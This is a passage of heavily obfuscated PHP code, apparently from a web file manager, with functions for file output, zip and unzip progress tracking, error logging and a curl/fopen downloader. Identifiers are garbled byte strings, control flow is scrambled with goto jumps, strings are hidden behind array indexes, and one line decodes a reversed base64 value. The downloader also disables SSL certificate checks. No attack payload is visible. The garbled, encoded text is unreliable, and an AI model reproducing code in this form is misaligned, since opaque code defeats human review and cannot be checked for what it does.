$GLOBALS[$a…ë•¡úë„[1124]] : $cÜè¢πêâ–[$a…ë•¡úë„[28]]; goto D’óÂ§«ÔÊ; B“ú…öÈ°: $a…ë•¡úë„ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cÜè¢πêâ– = $this->model->sourceInfo($Eº„£á‘ùã); if ($cÜè¢πêâ–[$a…ë•¡úë„[370]] == $a…ë•¡úë„[83]) { header($a…ë•¡úë„[1123]); die; } goto eùß¡òÜπ; D’óÂ§«ÔÊ: if ($BÇŸ√”õ£) { return IO::fileOutServer($E‡ˆº∞ô…∂[$a…ë•¡úë„[75]], $bí…Ù‰…óü, $e·µ∂ù‰¿É, $b‡Æ«êÜ≠—); } IO::fileOut($E‡ˆº∞ô…∂[$a…ë•¡úë„[75]], $bí…Ù‰…óü, $e·µ∂ù‰¿É, $b‡Æ«êÜ≠—); goto f§¨ÌèÑñØ; f§¨ÌèÑñØ: } public function fileOut($A©◊üíÜî†, $A≤„ª€Îúä = false, $C¢Çπ¶”„ÿ = false, $d÷å¥∏Ñç◊ = '') { $this->_fileOut($A©◊üíÜî†, $A≤„ª€Îúä, $C¢Çπ¶”„ÿ, $d÷å¥∏Ñç◊); } public function fileOutServer($bá±¶ˆŒ‘‘, $bìÊà£‹ô— = false, $AƒÖ ¨≤Ú  = false, $dÀ‹ä““øÏ = '') { $this->_fileOut($bá±¶ˆŒ‘‘, $bìÊà£‹ô—, $AƒÖ ¨≤Ú , $dÀ‹ä““øÏ, !0); } protected function _fileOutImage($e⁄„§ï©àù, $fˆ¯Éïõ¥‘ = 250) { $fÀ·†§≤îÑ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bÒ“√µøâŸ = $this->model->sourceInfo($e⁄„§ï©àù); if ($bÒ“√µøâŸ[$fÀ·†§≤îÑ[370]] == $fÀ·†§≤îÑ[83]) { show_json($fÀ·†§≤îÑ[1125] . $e⁄„§ï©àù, !1); } $GLOBALS[$fÀ·†§≤îÑ[1124]] = $bÒ“√µøâŸ[$fÀ·†§≤îÑ[28]]; $e‰Ö⁄◊Ô° = $this->model->fileInfoGet($e⁄„§ï©àù); IO::fileOutImage($e‰Ö⁄◊Ô°[$fÀ·†§≤îÑ[75]], $fˆ¯Éïõ¥‘); } public function fileOutImage($d“±ÀûÈç÷, $bá±ÜÖŒÂ≈ = 250) { $this->_fileOutImage($d“±ÀûÈç÷, $bá±ÜÖŒÂ≈); } public function fileOutImageServer($CÿÛÇ◊Íﬁª, $Eà√‚êãΩÈ = 250) { $this->_fileOutImage($CÿÛÇ◊Íﬁª, $Eà√‚êãΩÈ); } public function link($cã¡ãòÜ€ı, $F©ŒˆÁÑ⁄– = '') { $aõ„£¡úπƒ = $this->model->fileInfoGet($cã¡ãòÜ€ı); return IO::link($aõ„£¡úπƒ[$_SERVER[Ä¿¡‡öóµŸﬂ‡][75]], $F©ŒˆÁÑ⁄–); } protected function parse($c¡Œæ±íÃ„) { $CıäÔÇû∏æ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (strstr($c¡Œæ±íÃ„, $CıäÔÇû∏æ[8]) === !1) { return array($CıäÔÇû∏æ[385] => intval($c¡Œæ±íÃ„), $CıäÔÇû∏æ[75] => $CıäÔÇû∏æ[33], $CıäÔÇû∏æ[1122] => array()); } $CµîˆÀìŸˆ = explode($CıäÔÇû∏æ[8], trim($c¡Œæ±íÃ„, $CıäÔÇû∏æ[8])); if (count($CµîˆÀìŸˆ) < 2) { show_tips($c¡Œæ±íÃ„ . $CıäÔÇû∏æ[1126]); } return array($CıäÔÇû∏æ[385] => intval($CµîˆÀìŸˆ[0]), $CıäÔÇû∏æ[75] => $CµîˆÀìŸˆ[1], $CıäÔÇû∏æ[1122] => array_slice($CµîˆÀìŸˆ, 1)); } } goto E◊Ù»´◊Íê; BÚØˆó£ÇÈ: function beforeShutdownError($BµõÂ«⁄ÏÆ = false, $Dù‡£¢·›’ = '', $A¨õÜÉÖÁ = '', $C«àëï•Ñ“ = 0) { $aä›’¨£Ô◊ =& $_SERVER[ÁŸäœ¨]; switch ($BµõÂ«⁄ÏÆ) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $D∑ »…ì“É = $aä›’¨£Ô◊[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $D∑ »…ì“É = $aä›’¨£Ô◊[40]; break; case E_STRICT: $D∑ »…ì“É = $aä›’¨£Ô◊[41]; break; case E_NOTICE: case E_USER_NOTICE: $D∑ »…ì“É = $aä›’¨£Ô◊[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $D∑ »…ì“É = $aä›’¨£Ô◊[43]; break; default: break; } if (!$D∑ »…ì“É || $D∑ »…ì“É == $aä›’¨£Ô◊[42] || $D∑ »…ì“É == $aä›’¨£Ô◊[43]) { return; } $A¨õÜÉÖÁ = $aä›’¨£Ô◊[4] . str_replace($_SERVER[$aä›’¨£Ô◊[37]], $aä›’¨£Ô◊[20], $A¨õÜÉÖÁ); $fùä«˜ﬂöÓ = $D∑ »…ì“É . $aä›’¨£Ô◊[44] . $Dù‡£¢·›’ . $aä›’¨£Ô◊[44] . $A¨õÜÉÖÁ . $aä›’¨£Ô◊[44] . $C«àëï•Ñ“; write_log($fùä«˜ﬂöÓ . $aä›’¨£Ô◊[18] . get_caller_msg(1), $aä›’¨£Ô◊[19]); } $_SERVER[$_SERVER[ÁŸäœ¨][45]] = $_SERVER[$_SERVER[ÁŸäœ¨][37]] . $_SERVER[ÁŸäœ¨][46]; $f®Ö∞ìÑãø = strrev(base64_decode($_SERVER[ÁŸäœ¨][47])); goto EñØÊß®«≈; AÓ∏Òã‹›è: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto fÚ¯≥Ô◊»ù; Eÿßä◊√÷É: if (!$B…¶‰ñÜôÚ[$cô“ÿ¶∫á„[1344]]) { $B…¶‰ñÜôÚ[$cô“ÿ¶∫á„[1344]] = LNG($cô“ÿ¶∫á„[1512]); } goto Dà∫ËººíÌ; fÚ¯≥Ô◊»ù: $cô“ÿ¶∫á„ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; parent::startAfter(); Hook::bind($cô“ÿ¶∫á„[1508], array($this, $cô“ÿ¶∫á„[1509])); goto AõÉ´¿è£›; AõÉ´¿è£›: Hook::bind($cô“ÿ¶∫á„[1039], array($this, $cô“ÿ¶∫á„[1510])); $B…¶‰ñÜôÚ =& $this->task; $B…¶‰ñÜôÚ[$cô“ÿ¶∫á„[1511]] = $cô“ÿ¶∫á„[1044]; goto Eÿßä◊√÷É; Dà∫ËººíÌ: } protected function endAfter() { $eüñ∏˘ßä© =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; parent::endAfter(); Hook::unbind($eüñ∏˘ßä©[1508], array($this, $eüñ∏˘ßä©[1509])); Hook::unbind($eüñ∏˘ßä©[1039], array($this, $eüñ∏˘ßä©[1510])); } public function updateAfter() { $e⁄ã¿’Ÿåª =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $cîó‚Ñ≈ä• =& $this->task; if (!$cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[980]] || !$cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[698]]) { return; } if ($cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[1511]] == $e⁄ã¿’Ÿåª[1044]) { $E™ÑÑíÀ¶õ = 0; if ($cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[1483]]) { $E™ÑÑíÀ¶õ = $cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[1484]] / $cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[1483]]; } $cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[1439]] = $E™ÑÑíÀ¶õ * 0.3; } else { if ($cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[1511]] == $e⁄ã¿’Ÿåª[301]) { $E™ÑÑíÀ¶õ = $cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[994]] / $cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[980]]; $cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[1439]] = 0.3 + $E™ÑÑíÀ¶õ * 0.4; } else { if ($cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[1511]] == $e⁄ã¿’Ÿåª[103]) { $BÛ‘í«®Â = 0; if ($cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[1485]] == $e⁄ã¿’Ÿåª[103]) { $BÛ‘í«®Â = $cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[1484]]; } $E™ÑÑíÀ¶õ = ($cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[1488]] + $BÛ‘í«®Â) / $cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[698]]; $cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[1439]] = 0.3 + 0.4 + $E™ÑÑíÀ¶õ * 0.3; } } } if ($cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[1439]] > 0) { $f·Àè‹‹Ó = timeFloat() - $cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[1441]] - $cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[1444]]; $cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[1445]] = $f·Àè‹‹Ó * (1 - $cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[1439]]) / $cîó‚Ñ≈ä•[$e⁄ã¿’Ÿåª[1439]]; } } public function addFile($CœÖ˘ÚïÉ¶) { goto aäœäÔ¶œÃ; b“¬üÑ∑ïΩ: $CúÛ•Ôı…¿[$Fﬂêæé›Üü[980]] = 1; $C±›·ò‡íÿ = 0; $CúÛ•Ôı…¿[$Fﬂêæé›Üü[1492]] = array($Fﬂêæé›Üü[1493] => $C±›·ò‡íÿ + 1, $Fﬂêæé›Üü[386] => $Fúóàîçóê[$Fﬂêæé›Üü[28]], $Fﬂêæé›Üü[75] => $Fúóàîçóê[$Fﬂêæé›Üü[75]], $Fﬂêæé›Üü[466] => $Fúóàîçóê[$Fﬂêæé›Üü[466]] ? $Fúóàîçóê[$Fﬂêæé›Üü[466]] : $Fúóàîçóê[$Fﬂêæé›Üü[75]]); goto F∑ÿ“ßóﬂ´; bÈè´œ«éç: $CúÛ•Ôı…¿[$Fﬂêæé›Üü[982]] = $Fﬂêæé›Üü[1500]; $CúÛ•Ôı…¿[$Fﬂêæé›Üü[1485]] = $Fﬂêæé›Üü[1044]; $CúÛ•Ôı…¿[$Fﬂêæé›Üü[698]] = $Fúóàîçóê[$Fﬂêæé›Üü[77]]; goto b“¬üÑ∑ïΩ; DÛ©√å–¿£: $CúÛ•Ôı…¿[$Fﬂêæé›Üü[1481]] = $Fúóàîçóê[$Fﬂêæé›Üü[28]]; $CúÛ•Ôı…¿[$Fﬂêæé›Üü[1483]] = $Fúóàîçóê[$Fﬂêæé›Üü[77]]; $CúÛ•Ôı…¿[$Fﬂêæé›Üü[1484]] = 0; goto bÈè´œ«éç; aäœäÔ¶œÃ: $Fﬂêæé›Üü =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $CúÛ•Ôı…¿ =& $this->task; $Fúóàîçóê = IO::info($CœÖ˘ÚïÉ¶); goto DÛ©√å–¿£; F∑ÿ“ßóﬂ´: $this->update(); goto CÈπôëÎÆ©; CÈπôëÎÆ©: } public function unzipAfter($d¥≠≠¶ÿŒâ) { goto aÚÑÚùÍø‹; dèæÀ®Ó‰√: $BÌäﬁöƒÿÃ = IO::infoWithChildren($d¥≠≠¶ÿŒâ); $A·Ú®Ùüæƒ = 0; $a¡ıâ«⁄ø¡[$bΩÉÆ”äÍ‰[1492]] = array($bΩÉÆ”äÍ‰[1493] => $A·Ú®Ùüæƒ + 1, $bΩÉÆ”äÍ‰[386] => $BÌäﬁöƒÿÃ[$bΩÉÆ”äÍ‰[28]], $bΩÉÆ”äÍ‰[75] => $BÌäﬁöƒÿÃ[$bΩÉÆ”äÍ‰[75]], $bΩÉÆ”äÍ‰[466] => $BÌäﬁöƒÿÃ[$bΩÉÆ”äÍ‰[466]] ? $BÌäﬁöƒÿÃ[$bΩÉÆ”äÍ‰[466]] : $BÌäﬁöƒÿÃ[$bΩÉÆ”äÍ‰[75]]); goto EÂ±ı√πﬁë; d÷’ï≥∂º•: $this->update(); self::log($bΩÉÆ”äÍ‰[1513] . json_encode(array($a¡ıâ«⁄ø¡, $BÌäﬁöƒÿÃ))); goto cùƒ≥âıÎ∆; aÚÑÚùÍø‹: $bΩÉÆ”äÍ‰ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $a¡ıâ«⁄ø¡ =& $this->task; $a¡ıâ«⁄ø¡[$bΩÉÆ”äÍ‰[1511]] = $bΩÉÆ”äÍ‰[103]; goto dèæÀ®Ó‰√; eºÖ√˜∂Æ: $a¡ıâ«⁄ø¡[$bΩÉÆ”äÍ‰[994]] = 0; $a¡ıâ«⁄ø¡[$bΩÉÆ”äÍ‰[1483]] = 0; $a¡ıâ«⁄ø¡[$bΩÉÆ”äÍ‰[1484]] = 0; goto e∞ƒ„†å◊¥; EÂ±ı√πﬁë: if ($BÌäﬁöƒÿÃ[$bΩÉÆ”äÍ‰[29]] == $bΩÉÆ”äÍ‰[167]) { $a¡ıâ«⁄ø¡[$bΩÉÆ”äÍ‰[980]] = 1; } else { $a¡ıâ«⁄ø¡[$bΩÉÆ”äÍ‰[980]] = $BÌäﬁöƒÿÃ[$bΩÉÆ”äÍ‰[80]][$bΩÉÆ”äÍ‰[78]]; } $a¡ıâ«⁄ø¡[$bΩÉÆ”äÍ‰[982]] = $bΩÉÆ”äÍ‰[33]; $a¡ıâ«⁄ø¡[$bΩÉÆ”äÍ‰[1485]] = 0; goto eºÖ√˜∂Æ; e∞ƒ„†å◊¥: $a¡ıâ«⁄ø¡[$bΩÉÆ”äÍ‰[1481]] = $bΩÉÆ”äÍ‰[33]; $a¡ıâ«⁄ø¡[$bΩÉÆ”äÍ‰[1488]] = 0; $a¡ıâ«⁄ø¡[$bΩÉÆ”äÍ‰[698]] = $BÌäﬁöƒÿÃ[$bΩÉÆ”äÍ‰[77]]; goto d÷’ï≥∂º•; cùƒ≥âıÎ∆: } public function nameParse($b»Ö√àµÇë) { goto e·∞≥’Ö£Ã; fÔ™Ÿù∫óæ: $this->update(); goto EÆñæãÒç∞; d‡∆ŒéèØû: $fÚÊóôΩ±⁄ = get_path_this($b»Ö√àµÇë); if (strstr($fÚÊóôΩ±⁄, $CÈ»êáéøŒ[91])) { $Cèºº‰áÿ©[$CÈ»êáéøŒ[994]] += 1; $Cèºº‰áÿ©[$CÈ»êáéøŒ[980]] += 1; } $Cèºº‰áÿ©[$CÈ»êáéøŒ[1481]] = $b»Ö√àµÇë; goto fÔ™Ÿù∫óæ; e·∞≥’Ö£Ã: $CÈ»êáéøŒ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Cèºº‰áÿ© =& $this->task; if ($Cèºº‰áÿ©[$CÈ»êáéøŒ[1511]] == $CÈ»êáéøŒ[1044]) { $Cèºº‰áÿ©[$CÈ»êáéøŒ[1511]] = $CÈ»êáéøŒ[301]; $Cèºº‰áÿ©[$CÈ»êáéøŒ[1488]] = 0; $Cèºº‰áÿ©[$CÈ»êáéøŒ[698]] = 0; } goto d‡∆ŒéèØû; EÆñæãÒç∞: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $c’„Ë•Æ√Ø =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; parent::startAfter(); Hook::bind($c’„Ë•Æ√Ø[1514], array($this, $c’„Ë•Æ√Ø[1509])); $eç íé ∆¶ =& $this->task; $eç íé ∆¶[$c’„Ë•Æ√Ø[1511]] = $c’„Ë•Æ√Ø[1044]; if (!$eç íé ∆¶[$c’„Ë•Æ√Ø[1344]]) { $eç íé ∆¶[$c’„Ë•Æ√Ø[1344]] = LNG($c’„Ë•Æ√Ø[1515]); } } protected function endAfter() { $d≈´Ìﬁä†è =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; parent::endAfter(); Hook::unbind($d≈´Ìﬁä†è[1514], array($this, $d≈´Ìﬁä†è[1509])); } public function updateAfter() { $cå Èπö“ø =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $f„∆’ÈƒÌ® =& $this->task; if (!$f„∆’ÈƒÌ®[$cå Èπö“ø[980]] || !$f„∆’ÈƒÌ®[$cå Èπö“ø[698]]) { return; } if ($f„∆’ÈƒÌ®[$cå Èπö“ø[1511]] == $cå Èπö“ø[1044]) { $Bö„·çáÁó = $f„∆’ÈƒÌ®[$cå Èπö“ø[1484]]; if ($f„∆’ÈƒÌ®[$cå Èπö“ø[1485]] != $cå Èπö“ø[1044]) { $Bö„·çáÁó = 0; } $Cƒœêæß–ì = ($f„∆’ÈƒÌ®[$cå Èπö“ø[1488]] + $Bö„·çáÁó) / $f„∆’ÈƒÌ®[$cå Èπö“ø[698]]; $f„∆’ÈƒÌ®[$cå Èπö“ø[1439]] = $Cƒœêæß–ì * 0.3; } else { if ($f„∆’ÈƒÌ®[$cå Èπö“ø[1511]] == $cå Èπö“ø[301]) { $Cƒœêæß–ì = $f„∆’ÈƒÌ®[$cå Èπö“ø[994]] / $f„∆’ÈƒÌ®[$cå Èπö“ø[980]]; $f„∆’ÈƒÌ®[$cå Èπö“ø[1439]] = 0.3 + $Cƒœêæß–ì * 0.5; } else { if ($f„∆’ÈƒÌ®[$cå Èπö“ø[1511]] == $cå Èπö“ø[103]) { $Cƒœêæß–ì = 0; if ($f„∆’ÈƒÌ®[$cå Èπö“ø[1483]]) { $Cƒœêæß–ì = $f„∆’ÈƒÌ®[$cå Èπö“ø[1484]] / $f„∆’ÈƒÌ®[$cå Èπö“ø[1483]]; } $f„∆’ÈƒÌ®[$cå Èπö“ø[1439]] = 0.3 + 0.5 + $Cƒœêæß–ì * 0.2; } } } if ($f„∆’ÈƒÌ®[$cå Èπö“ø[1439]] > 0) { $aˆà¬í¯· = timeFloat() - $f„∆’ÈƒÌ®[$cå Èπö“ø[1441]] - $f„∆’ÈƒÌ®[$cå Èπö“ø[1444]]; $f„∆’ÈƒÌ®[$cå Èπö“ø[1445]] = $aˆà¬í¯· * (1 - $f„∆’ÈƒÌ®[$cå Èπö“ø[1439]]) / $f„∆’ÈƒÌ®[$cå Èπö“ø[1439]]; } } public function copyFileStart($b“”—Õå›õ, $aúÃìÑˆá¶, $C∆û˜òÓÀ¬, $CÒÁÏπ»≥ñ, $FãÊÕã•ë‘, $e…»Ûßßá¥) { $bó’Ì¡Ìú =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; parent::copyFileStart($b“”—Õå›õ, $aúÃìÑˆá¶, $C∆û˜òÓÀ¬, $CÒÁÏπ»≥ñ, $FãÊÕã•ë‘, $e…»Ûßßá¥); $EÒÜ¨ùé¿Ú =& $this->task; if ($EÒÜ¨ùé¿Ú[$bó’Ì¡Ìú[1511]] == $bó’Ì¡Ìú[301]) { $EÒÜ¨ùé¿Ú[$bó’Ì¡Ìú[1511]] = $bó’Ì¡Ìú[103]; } $this->update(); } public function copyFileEnd($FááéåŒìû, $c‡ì¢åıÂØ, $eœ·ò◊Úâå, $DÌ≤ñ‘Ÿ⁄Œ, $FΩÚ⁄ÇØ°≤, $b®ÇÇ∆Ï÷´) { $böˆ“Ê„ö⁄ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $C‡¯Æﬁ—ß¥ =& $this->task; $C‡¯Æﬁ—ß¥[$böˆ“Ê„ö⁄[1484]] = $C‡¯Æﬁ—ß¥[$böˆ“Ê„ö⁄[1483]]; $C‡¯Æﬁ—ß¥[$böˆ“Ê„ö⁄[1488]] += $C‡¯Æﬁ—ß¥[$böˆ“Ê„ö⁄[1483]]; $C‡¯Æﬁ—ß¥[$böˆ“Ê„ö⁄[1485]] = $böˆ“Ê„ö⁄[33]; $this->update(); } public function nameParse($DÈìı£õùë) { $e≤˜ƒπÃ“ß =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Fà˜Èü⁄‹∑ =& $this->task; if ($Fà˜Èü⁄‹∑[$e≤˜ƒπÃ“ß[994]] < $Fà˜Èü⁄‹∑[$e≤˜ƒπÃ“ß[980]]) { $A˘◊±ì∂Ôë = get_path_this($DÈìı£õùë); if (strstr($A˘◊±ì∂Ôë, $e≤˜ƒπÃ“ß[91])) { $Fà˜Èü⁄‹∑[$e≤˜ƒπÃ“ß[994]] += 1; } } if ($Fà˜Èü⁄‹∑[$e≤˜ƒπÃ“ß[1511]] == $e≤˜ƒπÃ“ß[1044]) { $Fà˜Èü⁄‹∑[$e≤˜ƒπÃ“ß[1511]] = $e≤˜ƒπÃ“ß[301]; } $Fà˜Èü⁄‹∑[$e≤˜ƒπÃ“ß[1481]] = $DÈìı£õùë; $this->update(); } } class Downloader { static function start($cÈããÜŸÓ, $fó†è©åôﬂ, $BãóøñÉ∑Æ = 10) { goto bñÑºåÒ±√; CÀ∫ºÜó¡”: $Añ√ºëìîÇ = $fó†è©åôﬂ . $FÊùöûÌÖ[1517]; if (is_array($cÈããÜŸÓ)) { $CÆí•É‰å¢ = $cÈããÜŸÓ; } else { $CÆí•É‰å¢ = url_header($cÈããÜŸÓ); } $cÈããÜŸÓ = $CÆí•É‰å¢[$FÊùöûÌÖ[295]]; goto f¢ŸÉÌ©ïõ; bñÑºåÒ±√: $FÊùöûÌÖ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!request_url_safe($cÈããÜŸÓ)) { return array($FÊùöûÌÖ[1036] => !1, $FÊùöûÌÖ[1038] => $FÊùöûÌÖ[1041]); } $AºÉÏ˜¥ë˜ = $fó†è©åôﬂ . $FÊùöûÌÖ[1516]; goto CÀ∫ºÜó¡”; f¢ŸÉÌ©ïõ: if (!$cÈããÜŸÓ) { return array($FÊùöûÌÖ[1036] => !1, $FÊùöûÌÖ[1038] => $FÊùöûÌÖ[1041]); } if (!$CÆí•É‰å¢[$FÊùöûÌÖ[1291]] || $CÆí•É‰å¢[$FÊùöûÌÖ[325]] == 0) { @unlink($Añ√ºëìîÇ); @unlink($fó†è©åôﬂ); $dñõËèä¥¨ = self::fileDownloadFopen($cÈããÜŸÓ, $fó†è©åôﬂ, $CÆí•É‰å¢[$FÊùöûÌÖ[325]]); if ($dñõËèä¥¨[$FÊùöûÌÖ[1036]]) { return $dñõËèä¥¨; } else { @unlink($Añ√ºëìîÇ); @unlink($fó†è©åôﬂ); $dñõËèä¥¨ = self::fileDownloadCurl($cÈããÜŸÓ, $fó†è©åôﬂ, !1, 0, $CÆí•É‰å¢[$FÊùöûÌÖ[325]]); @unlink($Añ√ºëìîÇ); return $dñõËèä¥¨; } } $bëˆ«ÒØ∂à = is_file($Añ√ºëìîÇ) ? filesize($Añ√ºëìîÇ) : 0; goto DúíÕ‰∞©‚; a—æú°á‘Â: if ($bëˆ«ÒØ∂à > $d√¨⁄ãˆ¥è) { @unlink($Añ√ºëìîÇ); } file_put_contents($AºÉÏ˜¥ë˜, json_encode($aÚ¢äÌÇ‚ı)); $dñõËèä¥¨ = self::fileDownloadCurl($cÈããÜŸÓ, $fó†è©åôﬂ, !0, $bëˆ«ÒØ∂à, $d√¨⁄ãˆ¥è); goto eöÎë√Ì±∫; eöÎë√Ì±∫: if ($dñõËèä¥¨[$FÊùöûÌÖ[1036]]) { @unlink($AºÉÏ˜¥ë˜); } return $dñõËèä¥¨; goto D”≥ÿ®ëŸÆ; DúíÕ‰∞©‚: $d√¨⁄ãˆ¥è = intval($CÆí•É‰å¢[$FÊùöûÌÖ[325]]); if (file_exists($Añ√ºëìîÇ) && time() - filemtime($Añ√ºëìîÇ) < 3) { return array($FÊùöûÌÖ[1036] => !1, $FÊùöûÌÖ[1038] => $FÊùöûÌÖ[1518]); } $aÚ¢äÌÇ‚ı = array(); goto båò†¿ÜÇ£; båò†¿ÜÇ£: if (is_file($AºÉÏ˜¥ë˜)) { $aÃæ¨Ëﬁ«∂ = file_get_contents($AºÉÏ˜¥ë˜); $aÚ¢äÌÇ‚ı = json_decode($aÃæ¨Ëﬁ«∂, 1); } if (file_exists($fó†è©åôﬂ) && $d√¨⁄ãˆ¥è == filesize($fó†è©åôﬂ)) { @unlink($Añ√ºëìîÇ); @unlink($AºÉÏ˜¥ë˜); return array($FÊùöûÌÖ[1036] => !0, $FÊùöûÌÖ[1038] => $FÊùöûÌÖ[1519]); } if ($aÚ¢äÌÇ‚ı[$FÊùöûÌÖ[325]] != $d√¨⁄ãˆ¥è) { $aÚ¢äÌÇ‚ı = array($FÊùöûÌÖ[325] => $d√¨⁄ãˆ¥è); } goto a—æú°á‘Â; D”≥ÿ®ëŸÆ: } static function fileDownloadFopen($AÊûé¢»ìØ, $bÖÔ¥ìÇ¢¶, $b≠¿Â…·¬∏ = 0) { $A’⁄∂Èâ≈© =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; @ini_set($A’⁄∂Èâ≈©[1520], $A’⁄∂Èâ≈©[1521]); $d¨‘Õ°ÖÃÔ = $bÖÔ¥ìÇ¢¶ . $A’⁄∂Èâ≈©[1517]; set_timeout(); @unlink($d¨‘Õ°ÖÃÔ); if ($f””ò⁄º§â = @fopen($AÊûé¢»ìØ, $A’⁄∂Èâ≈©[1522])) { goto cõ¬øá÷ÉÕ; cõ¬øá÷ÉÕ: if (!($E€òÀå˘Æ„ = @fopen($d¨‘Õ°ÖÃÔ, $A’⁄∂Èâ≈©[1523]))) { return array($A’⁄∂Èâ≈©[1036] => !1, $A’⁄∂Èâ≈©[1038] => $A’⁄∂Èâ≈©[1524]); } while (!feof($f””ò⁄º§â)) { if (!file_exists($d¨‘Õ°ÖÃÔ)) { fclose($E€òÀå˘Æ„); return array($A’⁄∂Èâ≈©[1036] => !1, $A’⁄∂Èâ≈©[1038] => $A’⁄∂Èâ≈©[1525]); } clearstatcache(); if ($b≠¿Â…·¬∏ > 0 && $b≠¿Â…·¬∏ == filesize(iconv_system($d¨‘Õ°ÖÃÔ))) { break; } fwrite($E€òÀå˘Æ„, fread($f””ò⁄º§â, 1024 * 8), 1024 * 8); } fclose($E€òÀå˘Æ„); goto A…©çúßıó; eÃ∆ø¢Â†: return array($A’⁄∂Èâ≈©[1036] => !0, $A’⁄∂Èâ≈©[1038] => $A’⁄∂Èâ≈©[696]); goto dç†Õƒ—¿è; A…©çúßıó: fclose($f””ò⁄º§â); self::checkGzip($d¨‘Õ°ÖÃÔ); if (!@rename($d¨‘Õ°ÖÃÔ, $bÖÔ¥ìÇ¢¶)) { usleep(round(rand(0, 1000) * 50)); @unlink($bÖÔ¥ìÇ¢¶); $d«ôëÿÖàÚ = @rename($d¨‘Õ°ÖÃÔ, $bÖÔ¥ìÇ¢¶); if (!$d«ôëÿÖàÚ) { return array($A’⁄∂Èâ≈©[1036] => !1, $A’⁄∂Èâ≈©[1038] => $A’⁄∂Èâ≈©[1526]); } } goto eÃ∆ø¢Â†; dç†Õƒ—¿è: } else { return array($A’⁄∂Èâ≈©[1036] => !1, $A’⁄∂Èâ≈©[1038] => $A’⁄∂Èâ≈©[1527]); } } static function fileDownloadCurl($D¶≥ùü¬·◊, $F†≠Ã”È›ı, $B≠öò£≈¨Ô = false, $e˜¡‘’µ¶≥ = 0, $céÌÚ¨˜ﬂ› = 0) { goto dÑêé«ü∂“; cüﬁ†åãÃ∞: curl_close($Cà≤≈á“ÆÏ); fclose($d˜çÚ´⁄…≠); $fﬁÉﬂ›ó‹˘ = filesize(iconv_system($e®∂©ìÉ¡∂)); goto aœÿ¬Àû⁄ö; Dàù≥®éæ˜: curl_setopt($Cà≤≈á“ÆÏ, CURLOPT_NOPROGRESS, !1); curl_setopt($Cà≤≈á“ÆÏ, CURLOPT_PROGRESSFUNCTION, $e”∞Ωô∫æÔ[1529]); curl_progress_start($Cà≤≈á“ÆÏ); goto b÷Ê◊ß‡˘ç; f…áöÙÑıö: if ($B≠öò£≈¨Ô) { curl_setopt($Cà≤≈á“ÆÏ, CURLOPT_RANGE, $e˜¡‘’µ¶≥ . $e”∞Ωô∫æÔ[724]); } curl_setopt($Cà≤≈á“ÆÏ, CURLOPT_FILE, $d˜çÚ´⁄…≠); curl_setopt($Cà≤≈á“ÆÏ, CURLOPT_REFERER, get_url_link($D¶≥ùü¬·◊)); goto a—ıñƒ⁄È¨; b÷Ê◊ß‡˘ç: curl_setopt($Cà≤≈á“ÆÏ, CURLOPT_USERAGENT, $e”∞Ωô∫æÔ[1521]); $dïö∞áÓ‹í = curl_exec($Cà≤≈á“ÆÏ); curl_progress_end($Cà≤≈á“ÆÏ); goto cüﬁ†åãÃ∞; dÑêé«ü∂“: $e”∞Ωô∫æÔ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $e®∂©ìÉ¡∂ = $F†≠Ã”È›ı . $e”∞Ωô∫æÔ[1517]; set_timeout(); goto bæ≤Ô˘¡Ùø; a—ıñƒ⁄È¨: curl_setopt($Cà≤≈á“ÆÏ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($Cà≤≈á“ÆÏ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($Cà≤≈á“ÆÏ, CURLOPT_SSL_VERIFYHOST, 0); goto Dàù≥®éæ˜; aœÿ¬Àû⁄ö: if ($fﬁÉﬂ›ó‹˘ < $céÌÚ¨˜ﬂ› && $céÌÚ¨˜ﬂ› != 0) { return array($e”∞Ωô∫æÔ[1036] => !1, $e”∞Ωô∫æÔ[1038] => $e”∞Ωô∫æÔ[1518]); } if ($dïö∞áÓ‹í && 